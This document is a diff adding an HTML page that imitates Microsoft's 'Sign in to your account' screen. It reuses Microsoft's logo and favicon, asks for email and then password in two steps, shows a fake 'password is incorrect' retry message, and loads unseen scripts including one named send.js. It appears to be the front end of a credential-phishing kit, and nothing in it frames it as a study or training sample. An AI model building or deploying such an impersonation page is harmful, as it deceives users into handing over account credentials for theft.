@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Sign in to your account</title>
+    <link rel="icon" href="https://pngimg.com/uploads/microsoft/microsoft_PNG13.png" type="image/x-icon" />
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="animation.css">
+    <link rel="stylesheet" href="responsive.css">
+</head>
+<body>
+    <div>
+        <div>
+        <div class="containner">
+            <div class="loading hidden" id="load">
+                <div class="dot hidden" id="hide1"></div>
+                <div class="dot hidden" id="hide2"></div>
+                <div class="dot hidden" id="hide3"></div>
+                <div class="dot hidden" id="hide4"></div>
+                <div class="dot hidden" id="hide5"></div>
+                <div class="dot hidden" id="hide6"></div>
+            </div>
+            <form action="" class="containner-all">
+                <div>
+                    <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="MicrosoftLogo">
+                </div>
+                <div class="arrw">
+                    <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" alt="arrow" class="hidden" id="hidden1">
+                    <p id="emailDisplay" class="email-display hidden"></p>
+                </div>
+                <h1 class="sI" id="sI">Sign in</h1>
+                <p id="reTry" class="hidden">Your account or password is incorrect. If you don't remember your password,<a href=""> reset it now.</a></p>
+                <p class="noEmail hidden">We couldn't find an account with that username. Try another, or <a href="" class="getNew">get a new Microsoft account.</a></p>
+                <input type="email" placeholder="Email, phone, or skype" class="transparent-input" id="emailInput">
+                <div id="emailForget">
+                    <p class="na">No account? <a href="#" class="create">Create one!</a></p>
+                <a href=""><p class="accessAct">Can't access your account?</p></a>
+                </div>
+                <div class="sButton">
+                    <div id="passwordSection" class="hidden">
+                        <input type="password" id="passwordInput" placeholder="Password" class="passwd">
+                        <div class="flt">
+                            <a href="" id="fp">Forget password?</a>
+                        </div>
+                        <button onclick="submitForm()" class="newSi">Sign in</button>
+                    </div>
+                    <div class="hidden"><br><br><br></div>
+                    <button class="btn-back" id="btn-back">Back</button>
+                    <button class="btn-next" id="btn" onclick="handleEmailInput()">Next</button>
+                </div>
+
+            </form>
+        </div>
+        <div class="containner2" id="signOption">
+            <div><img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="" width="30px"></div>
+            <p class="sG">Sign-In Options</p>
+        </div>
+    </div>
+</div>
+<footer>
+    <div class="footer1">
+        <p class="footer-text"><a href="" class="terms">Terms of use </a> <a href="" class="mg"> Privacy & cookies</a></p>
+    </div>
+</footer>
+</body>
+<script src="app.js"></script>
+<script src="auto.js"></script>
+<script src="send.js"></script>
+<script src="last.js"></script>
+<script src="outlook-integration.js"></script>
+</html>
